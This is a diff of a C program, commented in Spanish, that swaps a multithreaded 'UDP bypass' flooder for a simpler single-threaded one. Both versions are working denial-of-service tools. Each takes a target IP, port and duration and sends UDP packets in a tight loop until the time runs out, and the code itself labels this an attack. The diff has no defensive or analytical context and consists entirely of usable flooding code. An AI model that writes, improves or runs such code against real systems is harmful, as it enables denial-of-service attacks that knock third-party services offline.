@@ -6,68 +6,99 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <time.h>
-#include <pthread.h>
 
-#define MAX_THREADS 10
-#define PACKET_SIZE 1024
+#define DEFAULT_PACKET_SIZE 1024 // Tamaño del paquete por defecto
 
-void *udp_bypass_flood(void *arg) {
-    char **args = (char **)arg;
-    char *ip = args[0];
-    int port = atoi(args[1]);
-    int duration = atoi(args[2]);
-    
-    int sock;
-    struct sockaddr_in server_addr;
-    char packet[PACKET_SIZE];
-    
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(port);
-    inet_pton(AF_INET, ip, &server_addr.sin_addr);
-    
-    srand(time(NULL));
-    for(int i = 0; i < PACKET_SIZE; i++) {
-        packet[i] = rand() % 256;
+// Estructura para almacenar los parámetros del ataque
+typedef struct {
+    char ip[INET_ADDRSTRLEN];
+    int port;
+    int time;
+    int packet_size; // Tamaño del paquete ajustable
+} AttackParams;
+
+// Función para enviar paquetes UDP
+void send_udp_packet(int sockfd, struct sockaddr_in *dest_addr, int packet_size) {
+    char *packet = (char *)malloc(packet_size); // Asignar memoria dinámicamente
+    if (packet == NULL) {
+        perror("Error al asignar memoria para el paquete");
+        return;
     }
-    
-    time_t start = time(NULL);
-    unsigned long packets = 0;
-    
-    while(time(NULL) - start < duration) {
-        int size = 64 + (rand() % (PACKET_SIZE - 64));
-        sendto(sock, packet, size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
-        packets++;
-        
-        if(packets % 1000 == 0) {
-            close(sock);
-            sock = socket(AF_INET, SOCK_DGRAM, 0);
-        }
-    }
-    
-    close(sock);
-    printf("[UDPBYPASS] Thread sent %lu packets to %s:%d\n", packets, ip, port);
-    return NULL;
+
+    // Llenar el paquete con datos aleatorios (opcional, pero común para ataques)
+    memset(packet, 'A', packet_size);  // Rellenar con 'A'
+
+    sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)dest_addr, sizeof(*dest_addr));
+    free(packet); // Liberar la memoria asignada
 }
 
+
 int main(int argc, char *argv[]) {
-    if(argc < 4) {
-        printf("UDP Bypass\n");
-        printf("%s <IP> <PORT> <TIME>\n", argv[0]);
+    AttackParams params;
+    int sockfd;
+    struct sockaddr_in dest_addr;
+    time_t start_time, current_time;
+
+    // Verificar el número de argumentos
+    if (argc != 4) {
+        fprintf(stderr, "Uso: %s <ip> <puerto> <tiempo_en_segundos>\n", argv[0]);
         return 1;
     }
-    
-    pthread_t threads[MAX_THREADS];
-    
-    for(int i = 0; i < MAX_THREADS; i++) {
-        pthread_create(&threads[i], NULL, udp_bypass_flood, argv + 1);
+
+    // Obtener los parámetros del ataque de los argumentos de la línea de comandos
+    strncpy(params.ip, argv[1], INET_ADDRSTRLEN - 1);
+    params.ip[INET_ADDRSTRLEN - 1] = '\0'; // Asegurar la terminación nula
+    params.port = atoi(argv[2]);
+    params.time = atoi(argv[3]);
+    params.packet_size = DEFAULT_PACKET_SIZE; // Usar el tamaño de paquete por defecto
+
+    // Imprimir los parámetros del ataque (para verificación)
+    printf("IP objetivo: %s\n", params.ip);
+    printf("Puerto objetivo: %d\n", params.port);
+    printf("Duración del ataque: %d segundos\n", params.time);
+    printf("Tamaño del paquete: %d bytes\n", params.packet_size);
+
+
+    // Crear el socket UDP
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
+        perror("Error al crear el socket");
+        return 1;
     }
-    
-    for(int i = 0; i < MAX_THREADS; i++) {
-        pthread_join(threads[i], NULL);
+
+    // Configurar la dirección de destino
+    memset(&dest_addr, 0, sizeof(dest_addr));
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = htons(params.port);
+    if (inet_pton(AF_INET, params.ip, &dest_addr.sin_addr) <= 0) {
+        perror("Error al convertir la dirección IP");
+        close(sockfd);
+        return 1;
     }
-    
-    printf("[UDPBYPASS] Attack completed\n");
+
+    // Obtener la hora de inicio
+    start_time = time(NULL);
+
+    // Iniciar el ataque
+    printf("Iniciando ataque UDP...\n");
+    while (1) {
+        // Enviar el paquete UDP
+        send_udp_packet(sockfd, &dest_addr, params.packet_size);
+
+        // Obtener la hora actual
+        current_time = time(NULL);
+
+        // Verificar si el tiempo de ataque ha expirado
+        if (difftime(current_time, start_time) >= params.time) {
+            break;
+        }
+    }
+
+    // Finalizar el ataque
+    printf("Ataque UDP finalizado.\n");
+
+    // Cerrar el socket
+    close(sockfd);
+
     return 0;
 }
